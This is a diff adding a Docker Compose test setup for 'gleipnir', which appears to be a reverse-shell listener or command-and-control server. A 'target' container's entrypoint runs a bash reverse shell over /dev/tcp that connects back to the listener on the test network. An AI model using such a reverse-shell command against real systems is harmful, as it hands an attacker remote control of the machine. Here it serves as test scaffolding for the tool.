@@ -1,0 +1,45 @@
+services:
+  gleipnir:
+    build:
+      context: ..
+      dockerfile: Dockerfile
+    container_name: gleipnir-test
+    command: ["--port", "4444", "--api-port", "6666", "--no-tls", "--agent-dir", "/opt/gleipnir/agents"]
+    ports:
+      - "14444:4444"
+      - "16666:6666"
+      - "19001:9001"
+      - "19002:9002"
+    healthcheck:
+      test: ["CMD", "curl", "-sf", "http://localhost:6666/api/health"]
+      interval: 2s
+      timeout: 3s
+      retries: 10
+
+  gleipnir-auth:
+    build:
+      context: ..
+      dockerfile: Dockerfile
+    container_name: gleipnir-auth-test
+    command: ["--port", "4445", "--api-port", "6667", "--no-tls"]
+    environment:
+      GLEIPNIR_API_KEY: test-secret-key
+    ports:
+      - "16667:6667"
+    healthcheck:
+      test: ["CMD", "curl", "-sf", "-H", "Authorization: Bearer test-secret-key", "http://localhost:6667/api/health"]
+      interval: 2s
+      timeout: 3s
+      retries: 10
+
+  target:
+    image: debian:bookworm-slim
+    container_name: gleipnir-target
+    depends_on:
+      gleipnir:
+        condition: service_healthy
+    entrypoint: ["/bin/bash", "-c", "sleep 3 && bash -i >& /dev/tcp/gleipnir/9001 0>&1"]
+
+networks:
+  default:
+    name: gleipnir-test-net
